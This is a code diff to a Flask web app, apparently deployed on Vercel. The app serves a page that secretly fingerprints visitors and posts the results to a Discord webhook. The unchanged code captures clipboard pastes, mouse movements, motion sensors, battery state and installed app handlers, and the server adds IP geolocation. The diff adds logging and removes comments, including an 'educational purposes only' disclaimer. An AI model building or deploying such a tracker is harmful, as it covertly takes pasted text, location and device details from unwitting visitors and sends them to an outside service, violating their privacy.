@@ -2,9 +2,14 @@ from flask import Flask, request, render_template_string, jsonify
 import requests
 import os
 import textwrap
+import logging
+
+# Initialize logging
+logging.basicConfig(level=logging.INFO)
 
 app = Flask(__name__)
-DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "your-discord-webhook-here")
+# Use a default value for demonstration. Set the real value in Vercel Environment Variables.
+DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE")
 
 HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en">
@@ -155,7 +160,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         appCheck: window.appCheckResult || "Not Attempted"
       };
 
-      // Battery API (existing)
+      // Battery API
       try {
         const battery = await navigator.getBattery();
         fingerprint.battery = {
@@ -295,7 +300,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         y: e.clientY,
         time: Date.now()
       });
-      // Limit stored events
       if (mouseMovements.length > 200) {
         mouseMovements.shift();
       }
@@ -309,22 +313,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       });
     });
 
-    // 2. Battery API is already included in collectInfo
-
-    // 3. WebRTC Internal IP Leak is handled by getIPs()
-
-    // 4. Browser History Sniffing (Note: Most modern browsers patch this.)
-    // This demonstration uses CSS :visited styles but may not work reliably:
-    // (For educational purposes only)
-
-    // 5. Detect Login Status on Popular Sites using a hidden iframe (included above)
-
-    // 6. GPU + Audio + Canvas Fingerprinting enhancements can be added here as needed.
-    // (Consider using OfflineAudioContext for an alternate audio fingerprint.)
-
-    // 7. Voice & Speech Synthesis Info is captured by getVoicesInfo()
-
-    // 8. Clipboard Read Hook
+    // 2. Clipboard Read Hook
     document.addEventListener('paste', (e) => {
       const data = e.clipboardData.getData('text');
       pastedData.push({
@@ -333,7 +322,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       });
     });
 
-    // 9. Mobile Sensor Data (Gyroscope/Accelerometer)
+    // 3. Mobile Sensor Data (Gyroscope/Accelerometer)
     window.addEventListener('devicemotion', (e) => {
       sensorData.deviceMotion = {
         acceleration: e.acceleration,
@@ -352,8 +341,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       };
     });
 
-    // 10. Detect Installed Protocol Handlers (App Check)
-    // Attempt to open a protocol (this may be blocked by the browser)
+    // 4. Detect Installed Protocol Handlers (App Check)
     window.appCheckResult = "Not Detected";
     let appCheck = window.open("skype://", "_blank");
     if (appCheck) {
@@ -379,11 +367,13 @@ def home():
 def collect():
     data = request.json
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    
+    logging.info(f"Received data from IP: {ip}")
+
     try:
         ip_info = requests.get(f"https://ipinfo.io/{ip}/json").json()
     except Exception as e:
         ip_info = {"error": str(e)}
+        logging.error("IP info error: " + str(e))
 
     report = f"""
     🔍 **Advanced Fingerprint Report** - `{ip}`
@@ -444,9 +434,11 @@ def collect():
         for chunk in split_discord_message(report):
             requests.post(DISCORD_WEBHOOK, json={"content": chunk})
     except Exception as e:
+        logging.error("Error posting to Discord: " + str(e))
         return jsonify({"status": "error", "message": str(e)}), 500
 
     return jsonify({"status": "success"})
 
-if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+# For Vercel, export the Flask app without running the server directly.
+# Vercel will import this module and use the "app" variable.
+app  # Exported
